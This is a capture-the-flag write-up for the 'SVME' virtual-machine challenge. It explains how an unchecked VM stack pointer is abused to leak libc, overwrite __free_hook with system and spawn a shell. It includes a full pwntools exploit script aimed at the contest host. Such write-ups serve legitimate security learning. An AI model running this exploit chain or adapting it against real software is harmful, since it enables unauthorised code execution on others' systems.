# SVME

## Challenge

We're given a program which accepts code and runs it in a simple virtual machine.

The machine is open source and is available on GitHub:
[parrt/simple-virtual-machine-C](https://github.com/parrt/simple-virtual-machine-C).

## Solution

### First attempt

Originally, I was looking at buffer overflows which might lead to return oriented programming.

The binary had a canary and only read the expected number of characters.
However, the program had a buggy mechanism for chunked `read`s where you could skip sections of the stack.
This was due to the fact that the buffer pointer incremented by `sizeof(int)` each character read.
Instead, the buffer pointer should have been incremented by the number of characters read.
This vulnerability allows us to write practically anywhere on the stack greater than our buffer pointer, skipping canaries.

Unfortunately, this was a red herring as it was very hard to exploit without a leak.
I looked for LSB overwrites in the return address, but could not find any nearby functions that wouldve been useful.
Using a one\_gadget was another idea, but would have required a 16-bit bruteforce.

### Second attempt

Looking at the public GitHub repository, it's easy to see that there are very few measures in place for ensuring memory safety.

The easiest to exploit was the fact that the bounds of the stack pointer was not enforced.
This allowed me to overwrite the data structure of the virtual machine struct.

The virtual machine struct includes a stack pointer for its instructions array, and a heap pointer for global storage, as well as a local storage array.

First, I set the global storage pointer to point at the stack by copying over the stack pointer.
This allowed me to read stack addresses as if they were values in global storage.
I used this to retrieve the libc address from the stack and put it in local storage for later use.

Then, I set the global storage pointer to the address of `__free_hook`.
This gave me arbitrary writes within libc, which I used to write the address of `system` to `__free_hook`.

Finally, I set the global storage pointer to point back at the stack again.
I wrote `"/bin/sh"` to global storage and called halt.
This caused the program free the virtual machine's global storage, which called `system("/bin/sh")` due to the earlier steps.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 47.243.140.252 --port 1337 svme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('svme')
libc = ELF('libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '47.243.140.252'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

IADD = p32(1)
ISUB = p32(2)
ICONST = p32(9)
LOAD = p32(10)
GLOAD = p32(11)
STORE = p32(12)
GSTORE = p32(13)
PRINT = p32(14)
POP = p32(15)
HALT = p32(18)

io = start()

payload = flat({
    0: [
        POP,
        POP,
        POP,
        POP,
        POP,

        STORE, #code addr for stack leak
        p32(2),

        STORE,
        p32(1),

        LOAD, #stack addr as code addr
        p32(1),

        LOAD,
        p32(2),

        ICONST,
        p32(0x80),

        ICONST,
        p32(0),

        LOAD, #stack addr as globals addr
        p32(1),

        LOAD,
        p32(2),

        GLOAD, #libc_start_main_ret to free_hook
        p32(134),

        ICONST,
        p32(0x1c7a75),

        IADD,

        GLOAD,
        p32(135),

        STORE, #store free_hook
        p32(4),

        STORE,
        p32(3),

        POP,
        POP,

        LOAD, #libc as globals addr
        p32(3),

        LOAD,
        p32(4),

        LOAD, #free_hook to system addr
        p32(3),

        ICONST,
        p32(0x199718),

        ISUB,

        LOAD,
        p32(4),

        GSTORE, #system as free_hook
        p32(1),

        GSTORE,
        p32(0),

        POP,
        POP,

        LOAD, #stack as globals addr
        p32(1),

        LOAD,
        p32(2),

        ICONST,
        b'/bin',

        ICONST,
        b'/sh\x00',

        GSTORE, #binsh to globals
        p32(1),

        GSTORE,
        p32(0),

        ICONST,
        p32(0),

        HALT,
        ]
    }, length=0x200, filler=b'\x00')

io.send(payload)

io.interactive()
```

## Flag

`rwctf{simple_vm_escape_helps_warming_up_your_real_world_hacking_skill}`
